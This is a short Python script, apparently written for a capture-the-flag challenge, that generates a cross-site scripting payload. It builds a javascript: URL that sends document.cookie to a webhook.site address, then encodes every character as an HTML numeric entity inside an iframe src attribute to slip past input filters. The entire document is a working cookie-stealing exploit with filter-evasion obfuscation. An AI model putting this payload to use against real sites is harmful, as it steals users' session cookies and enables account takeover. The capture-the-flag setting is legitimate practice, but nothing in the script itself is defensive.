content = "javascript:fetch('https://webhook.site/b6d3460b-f270-42e1-a615-09293c122617?flag='+document.cookie).then((response) => {return response.json();}).catch((error) => {console.log('no');})"
result = "<iframe src=&#"
for i in content:
    result+=str(ord(i))
    result+=";&#"
result = result[:-3]+"><iframe>"
print(result)